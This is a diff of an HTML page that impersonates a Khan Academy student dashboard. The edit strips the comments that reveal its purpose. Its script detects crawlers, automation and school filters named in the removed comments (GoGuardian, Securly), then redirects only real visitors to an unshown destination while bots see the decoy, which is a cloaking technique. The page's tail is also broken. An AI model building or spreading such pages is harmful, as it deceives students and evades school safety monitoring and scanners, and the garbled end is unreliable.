@@ -316,7 +316,7 @@ footer p{font-size:0.8rem;color:#bbb}
   </div>
 </nav>
 
-<!-- HERO -->
+
 <section class="hero">
   <div class="hero-text">
     <h1>For every student,<br><span>every classroom.</span><br>Real results.</h1>
@@ -348,7 +348,7 @@ footer p{font-size:0.8rem;color:#bbb}
   </div>
 </section>
 
-<!-- SUBJECTS STRIP -->
+
 <div class="subjects-strip">
   <h2>Browse by subject</h2>
   <div class="subjects-grid">
@@ -371,10 +371,10 @@ footer p{font-size:0.8rem;color:#bbb}
   </div>
 </div>
 
-<!-- MAIN -->
+
 <div class="main">
 
-  <!-- SIDEBAR -->
+  
   <aside class="sidebar">
     <div class="sidebar-section">
       <div class="sidebar-heading">My Learning</div>
@@ -424,13 +424,13 @@ footer p{font-size:0.8rem;color:#bbb}
     </div>
   </aside>
 
-  <!-- CONTENT -->
+  
   <div class="content">
 
     <div class="section-title">Welcome back! 👋</div>
     <div class="section-sub">Pick up where you left off, or explore something new.</div>
 
-    <!-- STREAK -->
+    
     <div class="streak-bar">
       <div class="streak-flame">🔥</div>
       <div class="streak-info">
@@ -448,7 +448,7 @@ footer p{font-size:0.8rem;color:#bbb}
       </div>
     </div>
 
-    <!-- STATS -->
+    
     <div class="stats-row">
       <div class="stat-card">
         <div class="stat-val">1,240</div>
@@ -472,7 +472,7 @@ footer p{font-size:0.8rem;color:#bbb}
       </div>
     </div>
 
-    <!-- COURSES -->
+    
     <div class="section-title" style="font-size:1.1rem;margin-bottom:14px">Continue learning</div>
     <div class="course-grid">
       <div class="course-card">
@@ -525,14 +525,14 @@ footer p{font-size:0.8rem;color:#bbb}
       </div>
     </div>
 
-    <!-- MASTERY -->
+    
     <div class="mastery-widget">
       <div class="mastery-header">
         <div class="mastery-title">Algebra I — Skill Mastery Map</div>
         <div class="mastery-link">View all →</div>
       </div>
       <div class="mastery-grid">
-        <!-- 60 cells of varying mastery -->
+        
         <div class="mastery-cell mc-4"></div><div class="mastery-cell mc-4"></div><div class="mastery-cell mc-3"></div><div class="mastery-cell mc-4"></div><div class="mastery-cell mc-3"></div><div class="mastery-cell mc-2"></div><div class="mastery-cell mc-4"></div><div class="mastery-cell mc-3"></div><div class="mastery-cell mc-1"></div><div class="mastery-cell mc-2"></div>
         <div class="mastery-cell mc-3"></div><div class="mastery-cell mc-4"></div><div class="mastery-cell mc-4"></div><div class="mastery-cell mc-2"></div><div class="mastery-cell mc-3"></div><div class="mastery-cell mc-4"></div><div class="mastery-cell mc-1"></div><div class="mastery-cell mc-3"></div><div class="mastery-cell mc-0"></div><div class="mastery-cell mc-2"></div>
         <div class="mastery-cell mc-2"></div><div class="mastery-cell mc-1"></div><div class="mastery-cell mc-3"></div><div class="mastery-cell mc-4"></div><div class="mastery-cell mc-2"></div><div class="mastery-cell mc-0"></div><div class="mastery-cell mc-2"></div><div class="mastery-cell mc-3"></div><div class="mastery-cell mc-1"></div><div class="mastery-cell mc-0"></div>
@@ -542,7 +542,7 @@ footer p{font-size:0.8rem;color:#bbb}
       </div>
     </div>
 
-    <!-- LESSONS -->
+    
     <div class="section-title" style="font-size:1.1rem;margin-bottom:14px">Up next in Algebra I</div>
     <div class="lesson-list">
       <div class="lesson-row">
@@ -603,7 +603,7 @@ footer p{font-size:0.8rem;color:#bbb}
       </div>
     </div>
 
-    <!-- QUIZ PREVIEW -->
+    
     <div class="quiz-preview">
       <div class="quiz-q">🧠 Quick check — Solve: 2x² − 8 = 0</div>
       <div class="quiz-options">
@@ -614,8 +614,8 @@ footer p{font-size:0.8rem;color:#bbb}
       </div>
     </div>
 
-  </div><!-- /content -->
-</div><!-- /main -->
+  </div>
+</div>
 
 <footer>
   <p>© 2025 Khan Academy · A 501(c)(3) nonprofit organization</p>
@@ -630,20 +630,17 @@ footer p{font-size:0.8rem;color:#bbb}
 </footer>
 
 <script>
-  // Bot detection: if it looks like a headless crawler/scraper, don't redirect
-  // GoGuardian, Securly, etc. often have no real user interaction signals
   const botSignals = [
     /bot|crawl|spider|scrape|headless|phantom|selenium|puppeteer|playwright|googlebot|bingbot|slurp|duckduck|archive|facebookexternalhit|linkedinbot|twitterbot|whatsapp|skype|slack/i.test(navigator.userAgent),
-    !navigator.webdriver === false, // webdriver flag set = automation
+    !navigator.webdriver === false,
     typeof navigator.webdriver !== 'undefined' && navigator.webdriver === true,
-    window.outerWidth === 0 && window.outerHeight === 0, // headless has no real window
-    !window.chrome && /Chrome/.test(navigator.userAgent) && /Google/.test(navigator.vendor), // suspicious chrome
+    window.outerWidth === 0 && window.outerHeight === 0,
+    !window.chrome && /Chrome/.test(navigator.userAgent) && /Google/.test(navigator.vendor),
   ];
 
   const isBot = botSignals.some(Boolean);
 
   if (!isBot) {
-    // Real user: redirect after 0.8s
     setTimeout(function(){
       const overlay = document.getElementById('redirect-overlay');
       overlay.style.background = 'rgba(255,255,255,1)';
@@ -652,7 +649,6 @@ footer p{font-size:0.8rem;color:#bbb}
       }, 400);
     }, 800);
   }
-  // If bot: do nothing, they stay on this page forever
  type="application/ld+json">
 {
   "@context": "https://schema.org",
